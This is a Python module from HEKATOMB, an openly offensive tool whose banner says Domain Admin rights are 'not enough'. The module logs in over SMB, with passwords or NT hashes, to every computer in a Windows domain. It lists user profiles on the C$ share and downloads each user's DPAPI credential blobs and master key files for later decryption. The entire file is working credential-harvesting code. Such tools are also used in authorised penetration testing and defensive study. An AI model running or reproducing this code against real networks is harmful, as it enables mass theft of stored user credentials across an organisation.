#!/usr/bin/env python3
#
# HEKATOMB - Because Domain Admin rights are not enough. Hack them all.
#
# Blob folders Fonctions

import os, time, sys
import dns.resolver
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import SMB2_DIALECT_002


def Create_folders(domain, debug, debugmax):
    # creating folders to store blob and mkf
    if debug is True or debugmax is True:
        print("[+] Creating structure folders to store blob and mkf...")
    if domain == '':
        directory = 'Results'
    else:
        directory = domain
    blobFolder = domain + "/blob"
    mkfFolder  = domain + "/mfk"
    if not os.path.exists(directory):
        os.mkdir(directory)
    if not os.path.exists(blobFolder):
        os.mkdir(blobFolder)
    if not os.path.exists(mkfFolder):
        os.mkdir(mkfFolder)

    return blobFolder, mkfFolder, directory

def progress(count, total, status=''):
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))
    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))
    sys.stdout.flush()

def Get_blob_and_mkf(computers_list, users_list, username, password, domain, lmhash, nthash, myName, port, preferredDialect, blobFolder, mkfFolder, dns_server, debug, debugmax):
    if debug is True or debugmax is True:
            print("[+] Connnecting to all computers and try to get dpapi blobs and master key files ...")

    # Total of online computers
    total = len(computers_list)

    # Progress bar initialization
    count = int(0)
    progress(count, total, status=' Starting to collect files')
    time.sleep(2)
    
    for current_computer in computers_list:
        # connect to all computers and extract all users blobs and mkf

        count = count + 1
        progress(count, total, ' Collect in progress ....')

        try:
            # resolve dns to ip address
            resolver             = dns.resolver.Resolver(configure=False)
            resolver.nameservers = [dns_server]
            current_computer     = current_computer + "." + domain
            # trying dns resolution in TCP and if it fails, we try in UDP
            answer = resolver.resolve(current_computer, "A", tcp=True)
            if len(answer) == 0:
                answer = resolver.resolve(current_computer, "A", tcp=False)
                if len(answer) == 0:
                    print("DNS resolution for "+str(current_computer) + " has failed.")
                    sys.exit(1)
            else:
                answer = str(answer[0])
                
            smbClient  = SMBConnection(answer, answer, myName=myName, sess_port=int(port), timeout=10, preferredDialect=preferredDialect)
            smbClient.login(username, password, domain, lmhash, nthash)
            tid = smbClient.connectTree('c$')
            if tid != 1:
                sys.exit(1)
            # Instead of testing all users folder, just get content and compare folder names to usernames array to find existing folders faster (thanks to @kal-u for the idea)
            existing_users_folder = smbClient.listPath("C$", "\\users\\*")
            
            for current_user_folder in existing_users_folder:
                current_user_folder = str( str(current_user_folder).split("longname=\"")[1] ).split("\", filesize=")[0].lower()
                for current_user in users_list:
                    if current_user_folder != "." and current_user_folder != ".." :
                        if str(current_user[0]).lower() == str(current_user_folder).lower():
                            try:
                                if debugmax is True:
                                    print("Find existing user " + str(current_user[0]) + " on computer " + str(current_computer) )
                                response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\*")
                                is_there_any_blob_for_this_user = False
                                count_blobs = 0
                                count_mkf   = 0
                                for blob_file in response:
                                    blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
                                    if blob_file != "." and blob_file != "..":
                                        # create and retrieve the credential blob
                                        count_blobs     = count_blobs + 1
                                        computer_folder = blobFolder + "/" + str(current_computer)
                                        if not os.path.exists(computer_folder):
                                            os.mkdir(computer_folder)
                                        user_folder = computer_folder + "/" + str(current_user[0])
                                        if not os.path.exists(user_folder):
                                            os.mkdir(user_folder)
                                        wf = open(user_folder + "/" + blob_file,'wb')
                                        smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\" + blob_file, wf.write)
                                        is_there_any_blob_for_this_user = True
                                response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\*")

                                for blob_file in response:
                                    blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
                                    if blob_file != "." and blob_file != "..":
                                        # create and retrieve the credential blob
                                        count_blobs     = count_blobs + 1
                                        computer_folder = blobFolder + "/" + str(current_computer)
                                        if not os.path.exists(computer_folder):
                                            os.mkdir(computer_folder)
                                        user_folder = computer_folder + "/" + str(current_user[0])
                                        if not os.path.exists(user_folder):
                                            os.mkdir(user_folder)
                                        wf = open(user_folder + "/" + blob_file,'wb')
                                        smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\" + blob_file, wf.write)
                                        is_there_any_blob_for_this_user = True
                                if is_there_any_blob_for_this_user is True:
                                    # If there is cred blob there is mkf so we have to get them too
                                    response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\*")
                                    for mkf in response:
                                        mkf = str( str(mkf).split("longname=\"")[1] ).split("\", filesize=")[0]
                                        if mkf != "." and mkf != ".." and mkf != "Preferred" and mkf[0:3] != "BK-":
                                            count_mkf = count_mkf + 1
                                            wf        = open(mkfFolder + "/" + mkf,'wb')
                                            smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\" + mkf, wf.write)
                                    if debugmax is True:
                                        print("New credentials found for user " + str(current_user[0]) + " on " + str(current_computer) + " :")
                                        print("Retrieved " + str(count_blobs) + " credential blob(s) and " + str(count_mkf) + " masterkey file(s)")	
                            except KeyboardInterrupt:
                                os._exit(1)
                            except:
                                pass # this user folder do not exist on this computer
            if total == count:
                    progress(count, total, ' Collect complete .......')
                    print('\n')

        except KeyboardInterrupt:
            os._exit(1)
        except dns.exception.DNSException:
            if debugmax is True:
                print("Error on computer "+str(current_computer))
                import traceback
                traceback.print_exc()
            pass
        except:
            if debug is True:
                print("Debug : Could not connect to computer : " + str(current_computer))
            if debugmax is True:
                import traceback
                traceback.print_exc()
            pass # this computer is probably turned off for the moment
	
